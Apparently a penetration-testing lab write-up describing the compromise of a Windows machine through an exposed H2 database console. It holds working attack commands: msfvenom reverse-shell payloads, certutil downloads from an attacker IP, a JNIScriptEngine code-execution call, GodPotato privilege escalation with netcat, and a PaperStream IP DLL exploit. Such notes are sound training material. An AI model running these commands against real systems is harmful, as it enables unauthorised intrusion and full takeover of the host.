We discover port 80
# 80
![](attachment/253012439e700bfa67b5d41985a9b496.png)
We can change password with the api on this JDBC

# 8082
We are presented with H2 console:
![](attachment/6c5598326aef3da42ed907846c3b9599.png)
We can change the database to something that doesn't exist and check:
![](attachment/b990faebb47776755420216ac4334f34.png)
User tony found

We can try an exploit:
https://www.exploit-db.com/exploits/49384
![](attachment/7cf88c92418a295f4405a5f7c32ce757.png)
We got working code execution.

Now we can create a shell:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.236 LPORT=1234 -f exe > reverse.exe
```
now we can transfer this with:
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.236/reverse.exe C:/Users/Public/reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Now to get the reverse shell back:
```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Users/Public/reverse.exe").getInputStream()).useDelimiter("\\Z").next()');
```
![](attachment/47434bdcc2be5e83dbc07a1c6d987558.png)![](attachment/4cc18d8f5ae10442782b5ab8dcf59a43.png)
Nothing works

Using full path:
```
C:\Windows\system32\whoami.exe /priv
```
![](attachment/44b696b1da475ca1c724d357b930af3b.png)
We can also set the path:
```
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```
We have SeImpersonatePrivilege so trying Godpotato:
```
.\GodPotato.exe -cmd "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.236 9092"
```
![](attachment/6334a2fc86fe60242ddb752fecb10e65.png)
![](attachment/0a6f157d97bf42ceb9d07aaaacb2a39f.png)
We get a shell but it is a broken shell.

# Alternate Method

We find an unusual program:
![](attachment/36f48554f3640252ea10457a1f2010c1.png)
Using the exploit for PaperStream IP
https://www.exploit-db.com/exploits/49382
Now generate msfvenom payload:
```
msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.236 LPORT=9092
```

Transfer it to the machine:
```
certutil -urlcache -f http://192.168.45.236/shell.dll C:\Windows\Temp\UninOldIS.dll
```
Now run exploit:
```
.\paper.ps1
```